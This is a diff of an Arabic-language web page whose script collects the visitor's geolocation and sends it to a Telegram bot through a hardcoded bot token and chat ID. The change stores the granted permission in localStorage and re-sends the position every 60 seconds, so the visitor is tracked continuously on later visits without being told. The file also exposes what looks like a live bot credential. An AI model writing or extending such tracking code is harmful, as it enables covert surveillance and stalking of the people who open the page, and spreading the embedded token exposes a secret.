@@ -1,4 +1,4 @@
-html
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -8,13 +8,22 @@ html
     <script>
         const botToken = '5909067412:AAF16T7_MliWPBOIsALuQsoRAbb_dbXyvnM'; // استبدل هذا بتوكن البوت الخاص بك
         const chatId = '1051175859'; // استبدل هذا بمعرف الدردشة الخاص بك
-        let permissionGranted = false; // متغير لتتبع حالة الإذن
 
         function startLocationTracking() {
-            if (navigator.geolocation) {
+            // تحقق مما إذا كان الإذن قد تم منحه مسبقًا
+            const permissionGranted = localStorage.getItem('locationPermissionGranted');
+
+            if (permissionGranted) {
+                // إذا تم منح الإذن مسبقًا، ابدأ تتبع الموقع
                 navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+                startLocationInterval();
             } else {
-                document.getElementById("result").innerHTML = "المتصفح لا يدعم تحديد الموقع.";
+                // إذا لم يتم منح الإذن، اطلبه من المستخدم
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+                } else {
+                    document.getElementById("result").innerHTML = "المتصفح لا يدعم تحديد الموقع.";
+                }
             }
         }
 
@@ -34,14 +43,15 @@ html
                 })
                 .catch(error => console.error("خطأ:", error));
 
-            permissionGranted = true; // تم منح الإذن
+            // قم بتخزين حالة الإذن في localStorage
+            localStorage.setItem('locationPermissionGranted', true);
             document.getElementById("result").innerHTML = "تم الحصول على الموقع بنجاح.";
-            
+        }
+
+        function startLocationInterval() {
             // تحديد الموقع كل دقيقة (60000 مللي ثانية) بعد منح الإذن
             setInterval(() => {
-                if (permissionGranted) {
-                    navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-                }
+                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
             }, 60000);
         }
 
